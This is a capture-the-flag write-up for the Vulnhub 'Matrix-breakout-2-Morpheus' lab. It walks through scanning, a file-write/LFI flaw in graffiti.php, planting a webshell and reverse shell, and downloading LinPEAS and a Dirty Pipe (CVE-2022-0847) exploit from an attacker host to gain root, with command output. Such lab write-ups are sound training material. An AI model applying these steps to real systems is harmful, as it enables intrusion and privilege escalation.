# Vulnhub Matrix-breakout-2-Morpheus


Vulnhub Training Walkthrough -- Matrix-breakout-2-Morpheus

<!--more-->

## Knowledge

- LFI -- Local File Include
- LinPEAS -- 
- Dirty-Pipe CVE-2022-0847
- php://filter

## 1. Environment Setup

Download the [OVA file](https://download.vulnhub.com/matrix-breakout/matrix-breakout-2-morpheus.ova), import into VMware and just run.

## 2. Reconnaisence

### 1. IP Address

arp-scan scanner:

```shell
┌──(v4ler1an㉿kali)-[~]
└─$ sudo arp-scan -l
[sudo] password for v4ler1an:
Interface: eth0, type: EN10MB, MAC: 00:0c:29:9d:5b:9e, IPv4: 172.16.86.138
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
172.16.86.1	5e:52:30:c9:b7:65	(Unknown: locally administered)
172.16.86.2	00:50:56:fd:f8:ec	(Unknown)
172.16.86.153	00:0c:29:f6:3b:cd	(Unknown)
172.16.86.254	00:50:56:ed:8a:52	(Unknown)

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.250 seconds (113.78 hosts/sec). 4 responded
```

Target IP is 172.16.86.152.

### 2. Port Info

Scan the port and service:

```shell
┌──(v4ler1an㉿kali)-[~]
└─$ nmap -T4 -p- -sC -sV -sT -A -Pn 172.16.86.153
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-14 21:14 EST
Nmap scan report for 172.16.86.153
Host is up (0.00033s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey:
|_  256 aa:83:c3:51:78:61:70:e5:b7:46:9f:07:c4:ba:31:e4 (ECDSA)
80/tcp open  http    Apache httpd 2.4.51 ((Debian))
|_http-server-header: Apache/2.4.51 (Debian)
|_http-title: Morpheus:1
81/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Meeting Place
|_http-title: 401 Authorization Required
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.33 seconds
```

Port and service:

| port | service             |
| ---- | ------------------- |
| 22   | ssh                 |
| 80   | Apache httpd 2.4.51 |
| 81   | nginx 1.18.0        |

Access the 80 webpage:

![image-20231115102052270](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151020427.png)

The source of page is:

```shell
<html>
	<head><title>Morpheus:1</title></head>
	<body>
		Welcome to the Boot2Root CTF, Morpheus:1.
		<p>
		You play Trinity, trying to investigate a computer on the 
		Nebuchadnezzar that Cypher has locked everyone else out of, at least for ssh.
		<p>
		Good luck!

		- @jaybeale from @inguardians
		<p>
		<img src="trinity.jpeg">
	</body>
</html>

```

The picture is normal.

Access the 81 port:

![image-20231115102156307](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151021400.png)

Has a login page, but we have no name and password. The username maybe is `Trinity` or `Cypher`.

### 3. Web Directory

Scan the web directory:

```shell
┌──(v4ler1an㉿kali)-[~]
└─$ gobuster dir -u http://172.16.86.153 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,bak,txt,html -t 60
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.16.86.153
[+] Method:                  GET
[+] Threads:                 60
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,bak,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 348]
/.html                (Status: 403) [Size: 278]
/javascript           (Status: 301) [Size: 319] [--> http://172.16.86.153/javascript/]
/robots.txt           (Status: 200) [Size: 47]
/graffiti.txt         (Status: 200) [Size: 139]
/graffiti.php         (Status: 200) [Size: 451]
/.html                (Status: 403) [Size: 278]
/.php                 (Status: 403) [Size: 278]
/server-status        (Status: 403) [Size: 278]
Progress: 1102800 / 1102805 (100.00%)
===============================================================
Finished
===============================================================
```

We can find `robots.txt`, `graffiti.txt` and `graffiti.php` file, just look at it.

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ curl http://172.16.86.153/robots.txt
There's no white rabbit here.  Keep searching!
                                                                              
┌──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ curl http://172.16.86.153/graffiti.txt
Mouse here - welcome to the Nebby!

Make sure not to tell Morpheus about this graffiti wall.
It's just here to let us blow off some steam.

```

![image-20231115142554473](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151425610.png)

We found a message input box.

## 3. Exploit

Now, let's test `graffiti.php` with burp:

![image-20231115142725188](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151427316.png)

As we can see, when we text in message box, the server will return the `graffiti.txt` file, and what we input in message box will be accour here. So, here has a LFI vulnerability.

### 1. LFI

We can check out the `graffiti.php ` source code with php:filter through the LFI:

![image-20231115143317154](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151433288.png)

Decode with base64 and then got the source code:

```shell
<?php

$file="graffiti.txt";
if($_SERVER['REQUEST_METHOD'] == 'POST') {
    if (isset($_POST['file'])) {
       $file=$_POST['file'];
    }
    if (isset($_POST['message'])) {
        $handle = fopen($file, 'a+') or die('Cannot open file: ' . $file);
        fwrite($handle, $_POST['message']);
	fwrite($handle, "\n");
        fclose($file); 
    }
}

// Display file
$handle = fopen($file,"r");
while (!feof($handle)) {
  echo fgets($handle);
  echo "<br>\n";
}
fclose($handle);
?>
```

We fill the `file` parameter with `php://filter/read=convert.base64-encode/resource=graffiti.php`, and we got the source code of `graffiti.php`.

### 2. Upload the webshell

In the source code of `graffiti.php`, we can find that the `$file` variable with replaced with the POST's parameter `file`, and then write the `message` we inputed into the `file`. So, we can use it write a webshell here:

![image-20231115144010659](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151440825.png)

And then connect it with AntSword:

![image-20231115144659387](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151446555.png)

### 3. Get the reverse shell

And then we user a php reverse shell to get shell:

![image-20231115150726321](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151507489.png)

And then switch the shell by python:

```shell
$ python3 -c 'import pty;pty.spawn("/bin/bash")';
www-data@morpheus:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@morpheus:/$ ls
ls
FLAG.txt  boot	dev  home  lib32  libx32      media  opt   root  sbin  sys  usr
bin	  crew	etc  lib   lib64  lost+found  mnt    proc  run	 srv   tmp  var
www-data@morpheus:/$ cat FLAG.txt
cat FLAG.txt
Flag 1!

You've gotten onto the system.  Now why has Cypher locked everyone out of it?

Can you find a way to get Cypher's password? It seems like he gave it to
Agent Smith, so Smith could figure out where to meet him.

Also, pull this image from the webserver on port 80 to get a flag.

/.cypher-neo.png
```

## 4. Privilege Escalation

Now, we need to get root. We can find two user in home:

```shell
www-data@morpheus:/$ ls /home
ls /home
cypher	trinity
www-data@morpheus:/$ find / -user cypher -type f 2>/dev/null
find / -user cypher -type f 2>/dev/null
/FLAG.txt
www-data@morpheus:/$ find / -user trinity -type f 2>/dev/null
find / -user trinity -type f 2>/dev/null
/home/trinity/.bash_logout
/home/trinity/.bashrc
/home/trinity/.profile
```

Nothing useful. Let's use LinPEAS:

```shell
www-data@morpheus:/var/www/html$ wget http://172.16.86.138:8080/LinPEAS.sh
wget http://172.16.86.138:8080/LinPEAS.sh
--2023-11-15 06:35:55--  http://172.16.86.138:8080/LinPEAS.sh
Connecting to 172.16.86.138:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 847815 (828K) [text/x-sh]
Saving to: ‘LinPEAS.sh’

LinPEAS.sh          100%[===================>] 827.94K  --.-KB/s    in 0.04s

2023-11-15 06:35:55 (22.5 MB/s) - ‘LinPEAS.sh’ saved [847815/847815]

www-data@morpheus:/var/www/html$ ls
ls
LinPEAS.sh    graffiti.txt  php_reverse_shell.php  shell.php
graffiti.php  index.html    robots.txt		   trinity.jpeg
www-data@morpheus:/var/www/html$ ls -la
ls -la
total 1284
drwxr-xr-x 2 www-data www-data   4096 Nov 15 06:35 .
drwxr-xr-x 3 root     root       4096 Oct 28  2021 ..
-rw-r--r-- 1 www-data www-data 381359 Oct 28  2021 .cypher-neo.png
-rw-rw-rw- 1 www-data www-data 847815 Nov 15  2023 LinPEAS.sh
-rw-r--r-- 1 www-data www-data    778 Nov 15 05:34 graffiti.php
-rw-r--r-- 1 www-data www-data    181 Nov 15 05:29 graffiti.txt
-rw-r--r-- 1 www-data www-data    348 Oct 28  2021 index.html
-rw-r--r-- 1 www-data www-data   5495 Nov 15  2023 php_reverse_shell.php
-rw-r--r-- 1 www-data www-data     47 Oct 28  2021 robots.txt
-rw-r--r-- 1 www-data www-data     31 Nov 15 05:41 shell.php
-rw-r--r-- 1 www-data www-data  44297 Oct 28  2021 trinity.jpeg
www-data@morpheus:/var/www/html$ chmod +x LinPEAS.sh
chmod +x LinPEAS.sh

```

We can find something useful:

![image-20231115155130030](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151551250.png)

We can use Dirty-Pipe to get root. The [exploit](https://github.com/imfiver/CVE-2022-0847). Download it and then execute:

```shell
www-data@morpheus:/var/www/html$ wget http://172.16.86.138:8080/dirty_pipe.sh
wget http://172.16.86.138:8080/dirty_pipe.sh
--2023-11-15 06:47:08--  http://172.16.86.138:8080/dirty_pipe.sh
Connecting to 172.16.86.138:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4855 (4.7K) [text/x-sh]
Saving to: ‘dirty_pipe.sh’

dirty_pipe.sh       100%[===================>]   4.74K  --.-KB/s    in 0s

2023-11-15 06:47:08 (489 MB/s) - ‘dirty_pipe.sh’ saved [4855/4855]

www-data@morpheus:/var/www/html$ ls -la
ls -la
total 1292
drwxr-xr-x 2 www-data www-data   4096 Nov 15 06:47 .
drwxr-xr-x 3 root     root       4096 Oct 28  2021 ..
-rw-r--r-- 1 www-data www-data 381359 Oct 28  2021 .cypher-neo.png
-rwxrwxrwx 1 www-data www-data 847815 Nov 15  2023 LinPEAS.sh
-rw-rw-rw- 1 www-data www-data   4855 Nov 15 03:32 dirty_pipe.sh
-rw-r--r-- 1 www-data www-data    778 Nov 15 05:34 graffiti.php
-rw-r--r-- 1 www-data www-data    181 Nov 15 05:29 graffiti.txt
-rw-r--r-- 1 www-data www-data    348 Oct 28  2021 index.html
-rw-r--r-- 1 www-data www-data   5495 Nov 15  2023 php_reverse_shell.php
-rw-r--r-- 1 www-data www-data     47 Oct 28  2021 robots.txt
-rw-r--r-- 1 www-data www-data     31 Nov 15 05:41 shell.php
-rw-r--r-- 1 www-data www-data  44297 Oct 28  2021 trinity.jpeg
www-data@morpheus:/var/www/html$ chmod +x dirty_pipe.sh
chmod +x dirty_pipe.sh
www-data@morpheus:/var/www/html$ ./dirty_pipe.sh
./dirty_pipe.sh
/etc/passwd已备份到/tmp/passwd
It worked!

# 恢复原来的密码
rm -rf /etc/passwd
mv /tmp/passwd /etc/passwd
root@morpheus:/var/www/html# id
id
uid=0(root) gid=0(root) groups=0(root)
root@morpheus:/var/www/html# ls /root
ls /root
FLAG.txt
root@morpheus:/var/www/html# cat /root/FLAG.txt
cat /root/FLAG.txt
You've won!

Let's hope Matrix: Resurrections rocks!
```

## Attack Path

scann web directory --> analysis php file --> LFI --> upload webshell --> get revers shell --> privilege escalation

